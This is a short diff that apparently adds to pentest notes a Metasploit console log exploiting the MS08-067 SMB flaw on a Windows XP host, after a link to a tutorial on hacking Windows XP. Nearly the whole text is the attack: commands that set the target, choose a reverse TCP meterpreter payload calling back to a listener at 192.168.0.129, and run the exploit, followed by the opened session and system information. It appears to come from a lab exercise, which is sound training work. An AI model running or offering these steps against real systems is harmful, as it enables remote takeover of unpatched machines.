@@ -1,4 +1,35 @@
-https://blog.rapid7.com/2014/02/03/new-ms08-067/#https://github.com/sho-luv/getMSPatches
+http://www.binarytides.com/hack-windows-xp-metasploit/
+
+
+
+msf auxiliary(nbns_response) > use exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set RHOST 192.168.0.33
+RHOST => 192.168.0.33
+msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(ms08_067_netapi) > set LHOST 192.168.0.129
+LHOST => 192.168.0.129
+msf exploit(ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.129:4444 
+[*] 192.168.0.33:445 - Automatically detecting the target...
+[*] 192.168.0.33:445 - Fingerprint: Windows XP - Service Pack 0 / 1 - lang:English
+[*] 192.168.0.33:445 - Selected Target: Windows XP SP0/SP1 Universal
+[*] 192.168.0.33:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179267 bytes) to 192.168.0.33
+[*] Meterpreter session 1 opened (192.168.0.129:4444 -> 192.168.0.33:1032) at 2017-12-07 13:52:19 -0500
+
+meterpreter > sysinfo
+Computer        : UNIVERSI-Q2S87T
+OS              : Windows XP (Build 2600, Service Pack 1).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+
+
 
 Potential Vulnerability:
 
